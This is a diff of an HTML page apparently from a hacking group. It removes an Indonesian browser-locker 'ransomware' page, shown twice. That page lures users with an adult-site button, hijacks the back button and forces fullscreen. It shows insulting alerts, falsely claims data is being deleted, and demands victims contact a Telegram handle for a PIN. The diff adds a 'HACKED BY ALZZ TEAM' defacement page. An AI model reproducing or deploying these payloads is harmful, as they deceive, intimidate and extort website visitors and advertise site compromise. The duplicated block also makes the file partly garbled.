@@ -1,188 +1,152 @@
+
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PORn-INDO | PREMIUM ACCESS</title>
+    <title>HACKED BY ALZZ TEAM XNXX</title>
     <style>
-        body { background: #000; color: #fff; margin: 0; padding: 0; overflow: hidden; font-family: 'Arial', sans-serif; height: 100vh; width: 100vw; }
-        
-        /* Layar Pancingan */
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10001; }
-        .btn-start { padding: 20px 40px; font-size: 22px; background: #ff9900; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
-        
-        /* Layar Ransomware */
-        #ransom-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; }
-        .flash { animation: flash-bg 0.1s infinite; }
-        @keyframes flash-bg { 0% { background: #fff; } 50% { background: #000; } }
-        
-        h1 { color: red; font-size: 35px; text-shadow: 2px 2px #000; text-align: center; margin-top: 20px; }
-        video { width: 250px; position: absolute; z-index: 9999; border: 2px solid red; }
-        
-        /* Panel PIN */
-        .bottom-panel { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); padding: 20px; text-align: center; border-top: 2px solid red; }
-        input { padding: 15px; width: 80%; font-size: 18px; margin-bottom: 10px; border: none; border-radius: 5px; }
-        .btn-unlock { padding: 15px 30px; background: red; color: #fff; border: none; font-weight: bold; width: 85%; }
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            height: 100vh;
+        }
+        #matrix {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+        .snake {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background-color: #0f0;
+            border-radius: 50%;
+            z-index: 2;
+        }
+        #message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 48px;
+            text-align: center;
+            z-index: 3;
+            text-shadow: 0 0 10px #0f0;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+        #logo {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            z-index: 4;
+            font-size: 24px;
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        #sound {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            z-index: 4;
+        }
     </style>
 </head>
-<body onclick="forceFullscreen()">
-
-    <!-- UMPAN -->
-    <div id="overlay">
-        <img src="https://wikimedia.org" width="100" style="margin-bottom: 20px;">
-        <button class="btn-start" onclick="lockSystem()">MASUK KE PORn-INDO</button>
-        <p style="color: #666; margin-top: 10px;">Khusus Dewasa 18+</p>
-    </div>
-
-    <!-- RANSOMWARE -->
-    <div id="ransom-screen" class="flash">
-        <h1>HAHA TOLOL!!<br>PONSEL ANDA TERKUNCI!!</h1>
-        
-        <video id="idiotVideo" loop playsinline>
-            <source src="idiot_video.mp4" type="video/mp4">
-        </video>
-
-        <div class="bottom-panel">
-            <p style="color: yellow; font-weight: bold;">JIKA INGIN BEBAS CHAT TELEGRAM @alzzisback<br>MASUKIN PINNYA</p>
-            <input type="number" id="pinInput" placeholder="MASUKKAN PIN">
-            <button class="btn-unlock" onclick="verifyPin()">UNLOCK PERANGKAT</button>
-        </div>
-    </div>
+<body>
+    <canvas id="matrix"></canvas>
+    <div class="snake" id="snake1"></div>
+    <div class="snake" id="snake2"></div>
+    <div id="message">HACKED BY ALZZ TEAM XNXX</div>
+    <div id="logo">XNXX TEAM</div>
+    <audio id="sound" autoplay loop>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
-        const video = document.getElementById('idiotVideo');
-        const screen = document.getElementById('ransom-screen');
+        // Matrix Animation
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
 
-        // 1. Kunci Tombol Back (History Hijacking)
-        function antiBack() {
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function() {
-                window.history.pushState(null, null, window.location.href);
-                alert("GAK BISA KELUAR TOLOL! MASUKIN PIN!");
-            };
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.random() * -100;
         }
 
-        // 2. Aktifkan Ransomware
-        function lockSystem() {
-            document.getElementById('overlay').style.display = 'none';
-            screen.style.display = 'block';
-            video.play();
-            antiBack();
-            startBouncing();
-            forceFullscreen();
-        }
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-        // 3. Paksa Fullscreen (Menghilangkan Navigasi HP)
-        function forceFullscreen() {
-            let el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-        }
+            ctx.fillStyle = '#00ff00';
+            ctx.font = `${fontSize}px monospace`;
 
-        // 4. Animasi Video Mantul
-        function startBouncing() {
-            let x = 0, y = 0, dx = 8, dy = 8;
-            setInterval(() => {
-                if (x + video.offsetWidth > window.innerWidth || x < 0) dx = -dx;
-                if (y + video.offsetHeight > window.innerHeight || y < 0) dy = -dy;
-                x += dx; y += dy;
-                video.style.left = x + 'px';
-                video.style.top = y + 'px';
-            }, 30);
-        }
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
 
-        // 5. Cek PIN
-        function verifyPin() {
-            const pin = document.getElementById('pinInput').value;
-            if (pin === "201192777") {
-                alert("AKSES DITERIMA. JANGAN TOLOL LAGI!");
-                window.onbeforeunload = null;
-                location.reload(); 
-            } else {
-                alert("PIN SALAH DASAR TOLOL!");
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
             }
         }
 
-        // 6. Cegah Tutup Tab (Warning)
-        window.onbeforeunload = function() {
-            return "DATA ANDA SEDANG DIHAPUS!";
-        };
-    </script>
-</body>
-</html>
-    <!-- RANSOMWARE -->
-    <div id="ransom-screen" class="flash">
-        <h1>HAHA TOLOL!!<br>PONSEL ANDA TERKUNCI!!</h1>
-        
-        <video id="idiotVideo" loop playsinline>
-            <source src="idiot_video.mp4" type="video/mp4">
-        </video>
+        setInterval(drawMatrix, 33);
 
-        <div class="bottom-panel">
-            <p style="color: yellow; font-weight: bold;">JIKA INGIN BEBAS CHAT TELEGRAM @alzzisback<br>MASUKIN PINNYA</p>
-            <input type="number" id="pinInput" placeholder="MASUKKAN PIN">
-            <button class="btn-unlock" onclick="verifyPin()">UNLOCK PERANGKAT</button>
-        </div>
-    </div>
+        // Snake Animation
+        const snake1 = document.getElementById('snake1');
+        const snake2 = document.getElementById('snake2');
 
-    <script>
-        const video = document.getElementById('idiotVideo');
-        const screen = document.getElementById('ransom-screen');
+        let posX1 = 0, posY1 = 0;
+        let posX2 = 0, posY2 = 0;
+        let dirX1 = 2, dirY1 = 2;
+        let dirX2 = -2, dirY2 = -2;
 
-        // 1. Kunci Tombol Back (History Hijacking)
-        function antiBack() {
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function() {
-                window.history.pushState(null, null, window.location.href);
-                alert("GAK BISA KELUAR TOLOL! MASUKIN PIN!");
-            };
+        function moveSnake() {
+            posX1 += dirX1;
+            posY1 += dirY1;
+            posX2 += dirX2;
+            posY2 += dirY2;
+
+            if (posX1 <= 0 || posX1 >= window.innerWidth - 20) dirX1 *= -1;
+            if (posY1 <= 0 || posY1 >= window.innerHeight - 20) dirY1 *= -1;
+            if (posX2 <= 0 || posX2 >= window.innerWidth - 20) dirX2 *= -1;
+            if (posY2 <= 0 || posY2 >= window.innerHeight - 20) dirY2 *= -1;
+
+            snake1.style.left = posX1 + 'px';
+            snake1.style.top = posY1 + 'px';
+            snake2.style.left = posX2 + 'px';
+            snake2.style.top = posY2 + 'px';
+
+            requestAnimationFrame(moveSnake);
         }
 
-        // 2. Aktifkan Ransomware
-        function lockSystem() {
-            document.getElementById('overlay').style.display = 'none';
-            screen.style.display = 'block';
-            video.play();
-            antiBack();
-            startBouncing();
-            forceFullscreen();
-        }
+        moveSnake();
 
-        // 3. Paksa Fullscreen (Menghilangkan Navigasi HP)
-        function forceFullscreen() {
-            let el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-        }
+        // Cyber Message
+        const message = document.getElementById('message');
+        message.innerHTML = '<span style="color:#ff0000">VINCIT QUI SE VINCIT</span><br><span style="color:#ffff00">YOU HAVE BEEN HACKED</span>';
 
-        // 4. Animasi Video Mantul
-        function startBouncing() {
-            let x = 0, y = 0, dx = 8, dy = 8;
-            setInterval(() => {
-                if (x + video.offsetWidth > window.innerWidth || x < 0) dx = -dx;
-                if (y + video.offsetHeight > window.innerHeight || y < 0) dy = -dy;
-                x += dx; y += dy;
-                video.style.left = x + 'px';
-                video.style.top = y + 'px';
-            }, 30);
-        }
-
-        // 5. Cek PIN
-        function verifyPin() {
-            const pin = document.getElementById('pinInput').value;
-            if (pin === "201192777") {
-                alert("AKSES DITERIMA. JANGAN TOLOL LAGI!");
-                window.onbeforeunload = null;
-                location.reload(); 
-            } else {
-                alert("PIN SALAH DASAR TOLOL!");
-            }
-        }
-
-        // 6. Cegah Tutup Tab (Warning)
-        window.onbeforeunload = function() {
-            return "DATA ANDA SEDANG DIHAPUS!";
-        };
+        // Logo
+        const logo = document.getElementById('logo');
+        logo.innerHTML = 'XNXX TEAM<br><span style="font-size:16px;">ALZZ CYBER TEAM</span>';
     </script>
 </body>
 </html>
